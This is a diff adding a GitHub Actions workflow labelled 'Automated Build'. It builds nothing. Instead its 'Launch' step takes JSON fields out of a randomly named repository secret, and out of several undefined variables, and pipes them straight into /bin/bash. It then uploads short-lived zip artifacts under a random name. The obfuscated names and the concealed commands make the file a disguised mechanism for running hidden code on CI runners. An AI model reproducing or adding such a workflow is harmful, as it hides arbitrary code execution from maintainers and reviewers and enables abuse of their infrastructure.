@@ -1,0 +1,34 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          kyflb9964: ${{ secrets.kyflb9964 }}
+        run: |
+          printf '%s' "$kyflb9964" | jq -r .min5 | /bin/bash
+          printf '%s' "$hexkg3" | jq -r .qvkih7 | /bin/bash
+          echo $ha56 | jq -r .evuk428 | /bin/bash
+          printf '%s' "$yt19" | jq -r .nd46186 | /bin/bash
+          echo $csktf15286 | jq -r .azo9 | /bin/bash
+          printf '%s' "$hndtx8" | jq -r .y3492 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: XbeskiEM
+          path: "*.zip"
+          retention-days: 1
